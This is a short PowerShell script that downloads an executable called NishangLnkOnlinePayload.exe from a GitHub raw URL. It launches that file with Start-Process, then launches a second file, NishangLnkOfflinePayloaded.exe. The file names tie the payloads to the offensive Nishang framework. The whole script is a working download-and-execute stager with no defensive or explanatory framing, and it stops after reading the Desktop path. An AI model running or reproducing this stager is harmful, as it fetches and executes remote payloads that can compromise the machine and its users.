$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/nishang/NishangLnkOnlinePayload.exe'
$output = "NishangLnkOnlinePayloaded.exe"
$start_time = Get-Date

[ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 

wget $url -outfile $output

Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"

Start-Process -FilePath "NishangLnkOnlinePayloaded.exe"
Start-Process -FilePath "NishangLnkOfflinePayloaded.exe"

$DesktopPath = [Environment]::GetFolderPath('Desktop');
